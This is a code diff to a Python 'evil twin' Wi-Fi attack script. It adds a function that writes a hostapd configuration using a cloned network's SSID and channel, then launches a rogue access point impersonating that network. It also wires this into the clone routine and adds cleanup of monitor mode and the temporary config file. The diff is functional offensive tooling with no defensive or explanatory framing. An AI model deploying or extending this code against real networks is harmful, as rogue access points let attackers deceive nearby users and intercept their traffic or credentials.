@@ -235,7 +235,21 @@ def evil_twin(network_ssid, interface):
 	print("%s NETWORK NOT FOUND") % RED_ICON 
 	sys.exit(1)
 
+def start_ap(interface, ssid, channel):
+	#CHANGE CONF FILE
+	
+	f = open("tmp_files/hostapd.conf", "a")
 
+	f.write("hw_mode=g")
+	f.write("\ninterface=" + interface + "mon")
+	f.write("\nssid="      + ssid)
+	f.write("\nchannel="   + str(channel))
+	
+	f.close()
+	
+	#RUN EVIL AP
+	call("hostapd tmp_files/hostapd.conf", shell = True, stdout = open(os.devnull, "wb"))
+	
 def clone_network(network, interface):
 	print("%s SSID   : %s") % (BLUE_ICON, network.ssid)
 	print("%s BSSID  : %s") % (BLUE_ICON, network.address)
@@ -265,12 +279,14 @@ def clone_network(network, interface):
 			
 		# [...]
 		try:
-			print("%s EVIL TWIN STARTED") % GREEN_ICON
-			time.sleep(60)
+			print("%s EVIL AP '%s' STARTED") % (GREEN_ICON, network.ssid)
+			start_ap(interface, network.ssid, network.channel)
 		except KeyboardInterrupt:
 			print("\n%s DISABLING MONITOR MODE") % BLUE_ICON
+			time.sleep(2)
 			call("airmon-ng stop " + interface + "mon", shell = True, stdout = open(os.devnull, "wb"))
 			print("%s MONITOR MODE DISABLED") % GREEN_ICON
+			os.remove("tmp_files/hostapd.conf")
 			sys.exit(1)
 			
 					
